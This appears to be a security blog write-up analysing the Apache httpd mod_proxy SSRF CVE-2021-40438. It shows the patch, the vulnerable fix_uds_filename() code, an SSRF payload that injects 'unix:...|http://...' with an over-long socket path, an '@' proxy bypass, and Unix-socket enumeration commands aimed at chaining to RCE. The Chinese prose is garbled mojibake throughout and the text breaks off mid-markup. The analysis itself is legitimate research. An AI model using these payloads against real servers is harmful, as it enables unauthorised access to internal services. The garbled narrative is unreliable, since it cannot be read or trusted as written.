class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,<br>    <span class="hljs-string">&quot;configurations&quot;</span>: [<br><br>        &#123;   <br>            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;httpd-bin-gdb-debug&quot;</span>,<br>            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;cppdbg&quot;</span>,<br>            <span class="hljs-string">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-string">&quot;program&quot;</span>: <span class="hljs-string">&quot;/root/apache/httpd-bin/bin/httpd&quot;</span>,<br>            <span class="hljs-string">&quot;args&quot;</span>: [<span class="hljs-string">&quot;-X&quot;</span>, <span class="hljs-string">&quot;-DFOREGROUND&quot;</span>],<br>            <span class="hljs-string">&quot;stopAtEntry&quot;</span>: false,<br>            <span class="hljs-string">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;/root/apache/httpd-bin&quot;</span>,<br>            <span class="hljs-string">&quot;environment&quot;</span>: [],<br>            <span class="hljs-string">&quot;externalConsole&quot;</span>: false,<br>            <span class="hljs-string">&quot;MIMode&quot;</span>: <span class="hljs-string">&quot;gdb&quot;</span>,<br>            <span class="hljs-string">&quot;setupCommands&quot;</span>: [<br>                &#123;<br>                    <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;Enable pretty-printing for gdb&quot;</span>,<br>                    <span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;-enable-pretty-printing&quot;</span>,<br>                    <span class="hljs-string">&quot;ignoreFailures&quot;</span>: true<br>                &#125;<br>            ]<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é—­è¿œç¨‹æœåŠ¡å™¨çš„httpdæœåŠ¡ï¼Œä½¿ç”¨æœ¬åœ°vscodeçš„gdbé‡æ–°å¯åŠ¨å³å¯</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/6.png"></p><p>æ–­ç‚¹ä¸‹åœ¨proxy_util.c#fix_uds_filename()ï¼Œè®¿é—®åœ°å€ <a href="http://192.168.232.134/link">http://192.168.232.134/link</a>  æˆåŠŸæ–­åˆ°</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/7.png"></p><h2 id="2ã€æ¼æ´åˆ†æ"><a href="#2ã€æ¼æ´åˆ†æ" class="headerlink" title="2ã€æ¼æ´åˆ†æ"></a>2ã€æ¼æ´åˆ†æ</h2><h3 id="2-1-å®‰å…¨å…¬å‘Š"><a href="#2-1-å®‰å…¨å…¬å‘Š" class="headerlink" title="2.1 å®‰å…¨å…¬å‘Š"></a>2.1 å®‰å…¨å…¬å‘Š</h3><p>CVE-2021-40438 ä¸ºmod_proxyæ¨¡å—çš„SSRFæ¼æ´ï¼Œå®˜æ–¹å®‰å…¨å…¬å‘Šå½±å“ç‰ˆæœ¬ä¸º2.4.48åŠä»¥ä¸‹</p><p><a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/8.png"></p><h3 id="2-2-è¡¥ä¸å¯¹æ¯”"><a href="#2-2-è¡¥ä¸å¯¹æ¯”" class="headerlink" title="2.2 è¡¥ä¸å¯¹æ¯”"></a>2.2 è¡¥ä¸å¯¹æ¯”</h3><p>CVE-2021-40438 ä¿®å¤çš„committed:  <a href="https://github.com/apache/httpd/commit/520dcd80a45ce237e9a46ee28697e1b8af3fcd7e?diff=split">https://github.com/apache/httpd/commit/520dcd80a45ce237e9a46ee28697e1b8af3fcd7e?diff=split</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/9.png"></p><p>æˆ‘ä»¬æŸ¥ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°çš„ç”¨æ³•</p><p>ap_strcasestr(s1,s2):ä»s1ä¸­æœç´¢s2, è¿”å›s2å¼€å§‹çš„æŒ‡é’ˆï¼Œä¸è€ƒè™‘å¤§å°å†™ï¼Œç›¸åŒåˆ™è¿”å›0</p><p>ap_cstr_casecmpn(s1,s2,n): å¯¹æ¯”s2ä¸s1çš„å‰nä½ï¼Œä¸è€ƒè™‘å¤§å°å†™ï¼Œç›¸åŒåˆ™è¿”å›0</p><p>å‡½æ•°å®šä¹‰åœ¨</p><p><a href="https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__DAEMON.html#ga2ebda07cacb3088e5cbaca755303594b">https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__DAEMON.html#ga2ebda07cacb3088e5cbaca755303594b</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/10.png"></p><p><a href="https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__DAEMON.html#gaa6a7169f7d3801b11d3b113b27284dbd">https://ci.apache.org/projects/httpd/trunk/doxygen/group__APACHE__CORE__DAEMON.html#gaa6a7169f7d3801b11d3b113b27284dbd</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/11.png"></p><p>ç®€å•è§£é‡Šä¸‹æ­¤æ¬¡è¡¥ä¸å˜åŒ–ï¼šåŸæ¥æ˜¯ä»s1æ•´ä¸ªå­—ç¬¦ä¸²æœç´¢â€unix:â€ï¼Œç°åœ¨é™å®šåªèƒ½æ˜¯å‰5ä½ï¼Œä¹Ÿå°±æ˜¯s1éœ€è¦ä»¥â€unix:â€å¼€å¤´ã€‚æˆ‘ä»¬æŸ¥çœ‹ä¸‹æ¼æ´å‡½æ•°<code>proxy_util.c#fix_uds_filename()</code>  æ–¹æ³•ä»£ç </p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void fix_uds_filename(request_rec *r, char **url) <br>&#123;<br>    char *ptr, *ptr2;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (!r || !r-&gt;</span>filename) return;<br><span class="hljs-comment">//1ã€strncmp æ¯”è¾ƒr-&gt;filenameçš„å‰6ä½ä¸proxy:ï¼Œç›¸åŒè¿”å›0ï¼ŒåŒ…å«è¿”å›æ­£å€¼ ä¸åŒ…å«è¿”å›è´Ÿå€¼</span><br>    <span class="hljs-function"><span class="hljs-title">if</span> (!strncmp(r-&gt;</span>filename, <span class="hljs-string">&quot;proxy:&quot;</span>, <span class="hljs-number">6</span>) &amp;&amp;<br>            (<span class="hljs-function"><span class="hljs-title">ptr2</span> = ap_strcasestr(r-&gt;</span><span class="hljs-function"><span class="hljs-title">filename</span>, &quot;unix:&quot;)) &amp;&amp;  //2ã€ä»r-&gt;</span>filename æ•´ä¸ªå­—ç¬¦ä¸²ä¸­æœç´¢ unix:<br>            (ptr = ap_strchr(ptr2, <span class="hljs-string">&#x27;|&#x27;</span>))) &#123;<br>        apr_uri_t urisock;<br>        apr_status_t rv;<br>        *ptr = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-function"><span class="hljs-title">rv</span> = apr_uri_parse(r-&gt;</span>pool, ptr2, &amp;urisock);<br>        <span class="hljs-keyword">if</span> (rv == APR_SUCCESS) &#123;<br>            char *rurl = ptr+<span class="hljs-number">1</span>;<br>            <span class="hljs-function"><span class="hljs-title">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;</span>pool, urisock.<span class="hljs-built_in">path</span>);<span class="hljs-comment">//3ã€å¾—åˆ°udsè·¯å¾„</span><br>            <span class="hljs-function"><span class="hljs-title">apr_table_setn</span>(r-&gt;</span>notes, <span class="hljs-string">&quot;uds_path&quot;</span>, sockpath);<br>            *<span class="hljs-function"><span class="hljs-title">url</span> = apr_pstrdup(r-&gt;</span>pool, rurl); <span class="hljs-comment">/* so we get the scheme for the uds */</span><br>            <span class="hljs-comment">/* r-&gt;filename starts w/ &quot;proxy:&quot;, so add after that */</span><br>            <span class="hljs-function"><span class="hljs-title">memmove</span>(r-&gt;</span>filename+<span class="hljs-number">6</span>, rurl, strlen(rurl)+<span class="hljs-number">1</span>);<br>            ap_log_rerror(APLOG_MARK, APLOG_TRACE2, <span class="hljs-number">0</span>, r,<br>                    <span class="hljs-string">&quot;*: rewrite of url due to UDS(%s): %s (%s)&quot;</span>,<br>                    <span class="hljs-function"><span class="hljs-title">sockpath</span>, *url, r-&gt;</span>filename);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            *ptr = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»£ç ä»r-&gt;filenameä¸­æ ¹æ®<code>unix:</code>åŠ<code>|</code>çš„ä½ç½®è§£æå‡ºudsè·¯å¾„åŠurlï¼Œå¹¶ä¸”åˆ¤æ–­r-&gt;filenameæ˜¯å¦ä»¥<code>proxy:</code>å¼€å¤´</p><h3 id="2-3-åŸç†åˆ†æ"><a href="#2-3-åŸç†åˆ†æ" class="headerlink" title="2.3 åŸç†åˆ†æ"></a>2.3 åŸç†åˆ†æ</h3><p>è¯·æ±‚ä»£ç†è·¯ç”±<code>/link</code>ï¼Œçœ‹åˆ°äº†è¿™æ ·ä¸€æ¡æ—¥å¿—<code>URI path &#39;/link&#39; matches proxy handler &#39;proxy:http://127.0.0.1:8000/&#39;</code></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/12.png"></p><p>æ ¹æ®è¯¥æ—¥å¿—ä¿¡æ¯æ‰¾åˆ°äº†mod_proxy.c#ap_proxy_trans_match()ï¼Œå†æ¬¡å‘é€åï¼Œçœ‹åˆ°r-&gt;filenameçš„å€¼ä¸º<code>proxy:http://127.0.0.1:8000/</code>,ä»£ç†è¯·æ±‚<code>r-&gt;proxyreq</code>ä¸ºåå‘ä»£ç†<code>PROXYREQ_REVERSE</code></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/13.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/14.png"></p><p>è¿™æ ·å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆæ¼æ´å‡½æ•°<code>proxy_util.c#fix_uds_filename()</code>  éœ€è¦å…ˆæ£€æµ‹æ˜¯å¦ä»¥<code>proxy:</code>å¼€å¤´ã€‚æˆ‘ä»¬æŸ¥çœ‹apache mod_proxy udsçš„æ­£å¸¸ç”¨æ³•</p><p><a href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_proxy.html">https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_proxy.html</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/15.png"></p><p>apacheä»  2.4.7  å¼€å§‹æ”¯æŒäº†udsï¼ˆä½†ç»è¿‡å®é™…æµ‹è¯•ï¼Œæˆ‘åœ¨2.4.9æ‰æ‰¾åˆ°äº†æ”¯æŒudsè·¯å¾„çš„å†™æ³•ï¼‰ï¼Œå…·ä½“ç”¨æ³•æ˜¯<code>ProxyPass /links &quot;unix:/home/www.socket|http://localhost/whatever/&quot;</code>ï¼Œå½“è®¿é—®&#x2F;links  ä»£ç†é…ç½®ç»è¿‡<code>proxy_util.c#fix_uds_filename()</code>è§£æåï¼Œudsè·¯å¾„ä¸º<code>/home/www.socket</code>åŠè½¬å‘urlä¸º<code>http://localhost/whatever/</code>,ç»“åˆè¡¥ä¸ä»£ç ä¿®æ”¹éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†udsä»£ç†å­—ç¬¦ä¸²æ·»åŠ åˆ°å‚æ•°ä½ç½®è¿›è¡Œæµ‹è¯•ï¼š<code>/link?unix:/home/www.socket|http://localhost/whatever/</code></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/16.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/17.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/18.png"></p><p>å¯ä»¥çœ‹åˆ°ç»è¿‡proxy_util.c#fix_uds_filename()è§£æå¤„ç†ï¼ŒæˆåŠŸèµ‹å€¼ç»™uds_pathåŠè½¬å‘urlã€‚åˆ°è¿™é‡Œæ¼æ´è§¦å‘ç‚¹å°±æ˜äº†äº†ï¼šå½“ç›®æ ‡apacheä½¿ç”¨ä»£ç†æ¨¡å—æ—¶ï¼Œæ”»å‡»è€…é€šè¿‡åœ¨ä»£ç†è·¯ç”±çš„å‚æ•°æ³¨å…¥udsè·¯å¾„åŠè½¬å‘urlå®ç°ä»»æ„udsè¯·æ±‚&#x2F;urlè¯·æ±‚ã€‚ç°åœ¨å¯ä»¥è¯·æ±‚ä»»æ„udsåœ°å€ã€‚ä½†æ˜¯è·ç¦»ä»»æ„SSRFï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼šåœ¨ç»è¿‡fix_uds_filename()è§£æå‡ºudsã€urlåï¼Œä¼šåœ¨mod_proxy_http.c#ap_proxy_determine_connection()ä¸­å»è¯·æ±‚uds&#x2F;urlï¼Œå½“udsä¸å­˜åœ¨æ—¶ï¼Œæ‰ä¼šå»è¯·æ±‚url</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/19.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/20.png"></p><p>æ‰€ä»¥é—®é¢˜å°±å˜æˆäº†å¦‚æœä½¿è§£æå‡ºæ¥çš„udså€¼ä¸ºnullï¼Œè€å¤–ä½¿ç”¨äº†ä¸€ä¸ªå·§å¦™çš„æ–¹æ³•ï¼Œåœ¨fix_uds_filename()è§£æudsçš„ä»£ç ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">char</span> *sockpath = ap<span class="hljs-constructor">_runtime_dir_relative(<span class="hljs-params">r</span>-&gt;<span class="hljs-params">pool</span>, <span class="hljs-params">urisock</span>.<span class="hljs-params">path</span>)</span>;<br>apr<span class="hljs-constructor">_table_setn(<span class="hljs-params">r</span>-&gt;<span class="hljs-params">notes</span>, <span class="hljs-string">&quot;uds_path&quot;</span>, <span class="hljs-params">sockpath</span>)</span>;<br></code></pre></td></tr></table></figure><p>config.c#ap_runtime_dir_relative()</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/21.png"></p><p>åœ¨filepath.c#apr_filepath_merge()ä¸­ï¼Œå½“<code>rootpath</code>(&#x2F;root&#x2F;apache&#x2F;httpd-bin&#x2F;logs)ä¸ä¼ å…¥çš„è·¯å¾„é•¿åº¦ä¹‹å’Œ+4å¤§äº4096æ—¶ï¼Œè¿”å›åç§°è¿‡é•¿é”™è¯¯ã€‚å°±ä¼šå¯¼è‡´ä»£ç èµ°åˆ°1625è¡Œï¼Œè¿”å›uds_pathçš„å€¼ä¸ºnull</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/22.png"></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/23.png"></p><p>æ‰€ä»¥åœ¨unix:ä¸|ä¹‹é—´ä¼ å…¥å¤§äº(4097-4-len(rootpath))&#x3D;4066ä¸ªå­—ç¬¦æ—¶å°±ä¼šäº§ç”ŸSSRFæ¼æ´ï¼Œå¯ä»¥çœ‹åˆ°æœåŠ¡ç«¯æˆåŠŸè¯·æ±‚äº†åœ°å€ï¼š <a href="http://localhost:8001/whatever/">http://localhost:8001/whatever/</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/24.png"></p><p>è¿™æ ·ï¼Œæ¼æ´å°±å¯ä»¥è¾¾åˆ°SSRFã€ä»»æ„udsè¯·æ±‚çš„æ•ˆæœï¼Œæ¥ç€çœ‹çœ‹è¿™ä¸ªæ¼æ´åœ¨å®é™…æ¼æ´æŒ–æ˜åœºæ™¯ä¸­çš„æƒ…å†µ</p><h2 id="3ã€å®é™…åœºæ™¯"><a href="#3ã€å®é™…åœºæ™¯" class="headerlink" title="3ã€å®é™…åœºæ™¯"></a>3ã€å®é™…åœºæ™¯</h2><p>è¯¥æ¼æ´è§¦å‘çš„æ¡ä»¶æ˜¯Apache Httpdå¼€å¯mod_proxyæ¨¡å—ï¼Œä½¿ç”¨åˆ°åå‘ä»£ç†ä¸”è·¯ç”±å¯ä»¥ä»å‰å°è®¿é—®ã€‚å¦‚æœç›®æ ‡ç³»ç»Ÿæ»¡è¶³æ¡ä»¶ï¼Œå°±å¯ä»¥ä»å‰å°è¯·æ±‚åˆ°æœåŠ¡ç«¯å­˜åœ¨æ•æ„ŸåŠŸèƒ½çš„uds&#x2F;æœåŠ¡ï¼Œå®Œæˆä¸€ä¸ªå‰å°æ¼æ´çš„è§¦å‘ä¸²è”ã€‚æœ¬ç« èŠ‚æ¼”ç¤ºè¿™ä¸ªæ¼æ´åœ¨å®é™…åœºæ™¯ä¸­çš„ä¸€äº›æƒ…å†µ</p><h3 id="3-1-ç‰¹æ®Šé…ç½®"><a href="#3-1-ç‰¹æ®Šé…ç½®" class="headerlink" title="3.1 ç‰¹æ®Šé…ç½®"></a>3.1 ç‰¹æ®Šé…ç½®</h3><p>åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°å­˜åœ¨ä¸€ç§ç‰¹æ®Šé…ç½®ï¼Œå½“è·¯å¾„ä»¥&#x2F;ç»“å°¾ï¼Œä½†æ˜¯ä»£ç†åœ°å€ä¸ä»¥&#x2F;è¿›è¡Œç»“å°¾æ—¶ï¼Œå¯ä»¥é€šè¿‡@ç»•è¿‡ä»£ç†è§¦å‘SSRFæ¼æ´ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚å¦‚æœå¹³æ—¶æµ‹è¯•ç¢°åˆ°<code>/admin/module//login</code> ç±»ä¼¼è·¯å¾„ï¼Œå¯ä»¥ä½¿ç”¨<code>/admin/module/@127.0.0.1:8833</code> æµ‹è¯•ï¼Œå¦‚æœæ°å¥½httpdä½¿ç”¨çš„<strong>è·¯å¾„ä»¥&#x2F;ç»“å°¾ï¼Œä½†æ˜¯ä»£ç†åœ°å€ä¸ä»¥&#x2F;è¿›è¡Œç»“å°¾</strong>çš„ç‰¹æ®Šé…ç½®æ—¶ï¼Œç›®æ ‡æœºå™¨ä¼šè§¦å‘ssrfæ¼æ´è¯·æ±‚127.0.0.1:8833</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">ProxyPass <span class="hljs-regexp">/lin/</span> <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br>ProxyPassReverse <span class="hljs-regexp">/lin/</span> <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br><br>ä¼šé€ æˆSSRFé—®é¢˜<br><span class="hljs-regexp">/lin/</span>@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8001</span>   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span>@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8001</span><br></code></pre></td></tr></table></figure><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/25.png"></p><h3 id="3-2-æ¼æ´æ€è€ƒï¼Ÿ"><a href="#3-2-æ¼æ´æ€è€ƒï¼Ÿ" class="headerlink" title="3.2 æ¼æ´æ€è€ƒï¼Ÿ"></a>3.2 æ¼æ´æ€è€ƒï¼Ÿ</h3><p>åœ¨åˆ†æå®ŒCVE-2021-40438åæ„Ÿè§‰è¿™ä¸ªæ¼æ´çš„å½±å“æ˜¯è¢«ä½ä¼°çš„ï¼Œè¯¥æ¼æ´èƒ½è¦†ç›–å½±å“Httpd 2.4.9-2.4.48 è¿‘40ä¸ªå°ç‰ˆæœ¬ã€mod_proxy ProxyPassé…ç½®å¾ˆå¸¸è§ã€ä»£ç†ä¹Ÿå¤šä¸ºå‰å°è§¦å‘è®¿é—®ï¼Œéå¸¸é€‚åˆåšä¸ºæ¼æ´æŒ–æ˜ç»•è¿‡æƒé™çš„çªç ´å£ ã€‚å½“æ—¶æ­£åœ¨ç ”ç©¶Vmwareå®¶çš„Vmware Vrealize operationsäº§å“ï¼Œä¹Ÿè·Ÿè¿›æµ‹è¯•äº†æœ€æ–°ç‰ˆï¼Œå‘ç°éƒ¨ç½²çš„æ˜¯httpd 2.4.46ç‰ˆæœ¬ã€é…ç½®ä½¿ç”¨äº†ä»£ç†æ¨¡å—ã€è·¯ç”±ä¹Ÿå¯ä»¥ä»å‰å°è§¦å‘ã€‚æ‰€ä»¥æœ€æ–°ç‰ˆæ˜¯å—CVE-2021-40438å½±å“çš„ï¼Œä½†æ˜¯å½“æ—¶å¹¶æ²¡æœ‰æ‰¾åˆ°åç«¯å¯ç”¨çš„udså®Œæˆrceï¼Œæ¯”è¾ƒé—æ†¾ã€‚åªç»™vmwareå‘äº†ssrfçš„æŠ¥å‘Šï¼Œåé¢å®˜æ–¹å‡ºäº†å®‰å…¨æ›´æ–°å‡çº§äº†httpdçš„ç‰ˆæœ¬</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/26.png"></p><p>å®˜æ–¹å‡ºçš„å…¬å‘Šï¼š<a href="https://kb.vmware.com/s/article/87227">https://kb.vmware.com/s/article/87227</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/27.png"></p><p>å¤ç°æˆªå›¾</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/28.png"></p><h3 id="3-3-å‘RCEè¿›å‘"><a href="#3-3-å‘RCEè¿›å‘" class="headerlink" title="3.3 å‘RCEè¿›å‘"></a>3.3 å‘RCEè¿›å‘</h3><p>ç”±äºåœ¨vmwareäº§å“ä¸­æ²¡æœ‰æ‰¾åˆ°å¯åˆ©ç”¨çš„udså®ŒæˆRCEï¼Œæ¯”è¾ƒé—æ†¾ä½†æ˜¯å¹¶æ²¡æœ‰æ”¾å¼ƒè¿™ä¸ªæ”»å‡»é¢ã€‚åç»­ä¹Ÿå®¡è®¡äº†å‡ æ¬¾åº”ç”¨ï¼Œæœ€ç»ˆæˆåŠŸåœ¨XXXä¸XXXäº§å“ä¸­ä¸²è”èµ·æ¥å®Œæˆäº†RCEã€‚å¦‚æœæƒ³è¦å®ŒæˆRCEçš„æ•ˆæœéœ€è¦ä¸²è”åç«¯çš„æ•æ„ŸæœåŠ¡ï¼Œå…¶ä¸­WEBæœåŠ¡çš„å®¡è®¡ä¸å¹³æ—¶å®¡è®¡æ€è·¯å·®åˆ«ä¸å¤§ï¼Œè€Œè‡ªå·±å¯¹äºudséƒ¨åˆ†çš„çŸ¥è¯†è¿˜æ˜¯æ¬ ç¼ºçš„ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™æ¬¡æœºä¼šåšä¸€æ³¢çŸ¥è¯†å‚¨å¤‡ã€‚<strong>æ‰©å¤§çŸ¥è¯†é¢-&gt;çŸ¥è¯†é¢å†³å®šæ”»å‡»é¢ï¼</strong></p><p>åœ¨æŸ¥æ‰¾èµ„æ–™è¿‡ç¨‹ä¸­çœ‹åˆ°ç™¾åº¦å®‰å…¨å›¢é˜Ÿåœ¨blackhat 2022å¤§ä¼šä¸Šå¯¹å®‰å“ä¸Šå¾—Unix Domain Socket æ”»å‡»é¢åšäº†æ¢³ç†ï¼Œ å¯ä»¥ä½œä¸ºçŸ¥è¯†è¡¥å……å­¦ä¹ ä¸€æ³¢ã€‚è®®é¢˜åç§°ï¼šUnix Domain Socket: A Hidden Door Leading to Privilege Escalation in the Android Ecosystem     è®®é¢˜paperï¼š<a href="https://developer.baidu.com/article/detail.html?id=295123">https://developer.baidu.com/article/detail.html?id=295123</a>   è®®é¢˜slidesï¼š<a href="https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-Ke-Unix-Domain-Socket-A-Hidden-Door.pdf">https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-Ke-Unix-Domain-Socket-A-Hidden-Door.pdf</a></p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/29.png"></p><p>unixåŸŸå¥—æ¥å­—uds(Unix Domain Socket)ä¸ä¼ ç»Ÿç½‘ç»œå¥—æ¥å­—å¾—ä¸»è¦åŒºåˆ«æ˜¯ï¼šç½‘ç»œå¥—æ¥å­—ä½¿ç”¨ipä¸ç«¯å£æ ‡è¯†å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ï¼Œè€ŒåŸŸå¥—æ¥å­—udsä½¿ç”¨ç³»ç»Ÿæ–‡ä»¶åï¼Œè¿™ä¸ªæ–‡ä»¶è¢«ç§°ä¸ºå¥—æ¥å­—æ–‡ä»¶ã€‚å¥—æ¥å­—æ–‡ä»¶æœ‰ä¸¤ç§å½¢å¼ï¼šä¸€ç§æ˜¯ç»å¯¹è·¯å¾„ ç±»ä¼¼&#x2F;var&#x2F;rpc&#x2F;rpc.sockï¼›å¦å¤–ä¸€ç§æ˜¯æŠ½è±¡è·¯å¾„ ç±»ä¼¼@jd-controlï¼Œå³ä¸€ä¸ªä¸å­˜åœ¨å¾—è·¯å¾„ã€‚è¿™é‡Œæ•´ç†äº†å‡ ä¸ªä¸udsç›¸å…³çš„å‘½ä»¤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">netstat -a -p --unix   <span class="hljs-regexp">//</span>åˆ—å‡ºæœ¬åœ°å¾—unixå¥—æ¥å­—<br>lsof -U  <span class="hljs-regexp">//</span>æ˜¾ç¤ºudsçš„ç›¸å…³ä¿¡æ¯<br>fuser -v <span class="hljs-regexp">/var/</span>rpc.sock  <span class="hljs-regexp">//</span>æ˜¾ç¤ºä½¿ç”¨è¯¥å¥—æ¥å­—çš„ç”¨æˆ·ã€è¿›ç¨‹pidã€è®¿é—®æ–¹å¼å’Œå‘½ä»¤ç­‰ä¿¡æ¯<br></code></pre></td></tr></table></figure><p>åœ¨å®¡è®¡XXXç³»ç»Ÿæ—¶ï¼Œå‘ç°å…¶ä½¿ç”¨äº†Apache httpd 2.4.41ç‰ˆæœ¬ï¼Œåœ¨&#x2F;apache&#x2F;conf&#x2F;httpd.confä¸­çœ‹åˆ°é…ç½®å¯åŠ¨äº†ä»£ç†æ¨¡å—mod_proxy(ä½¿ç”¨æŒ‡ä»¤ProxyPassã€ProxyPassReverse)ï¼Œä¸”ä»£ç†è·¯ç”±å¯ä»¥ä»å‰å°è®¿é—®ï¼Œæ»¡è¶³è¯¥æ¼æ´çš„æ¡ä»¶è¦æ±‚</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/30.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾èƒ½å¤Ÿä¸²è”èµ·æ¥å®Œæˆåˆ©ç”¨çš„åç«¯æœåŠ¡ï¼Œæœ¬æ¬¡å®¡è®¡ä¸»è¦èšç„¦äºudsã€‚<code>lsof -U</code>å‘½ä»¤ç”¨äºæ˜¾ç¤ºUnix Domain Socket (UDS)çš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬å“ªäº›è¿›ç¨‹æ­£åœ¨ä½¿ç”¨æŒ‡å®šçš„UDSæ–‡ä»¶ä»¥åŠå®ƒä»¬çš„è¯¦ç»†ä¿¡æ¯</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/31.png"></p><p>çœ‹åˆ°æœ‰ä¸ªxmlrpc.sockã€xmlrpc0.sockã€xmlrpc1.sockï¼Œæ£€ç´¢ä¸‹ç›¸å…³è¿›ç¨‹</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/32.png"></p><p>è¿™ä¸ªæ˜¯pythonå¯åŠ¨çš„åç«¯è¿›ç¨‹ï¼Œè€Œè¯¥ç³»ç»Ÿçš„WEBå‰å°XXXæ•æ„ŸåŠŸèƒ½å¤„ä¸åç«¯çš„xmlrpc udsæœ‰äº¤äº’è¯·æ±‚</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/33.png"></p><p><img 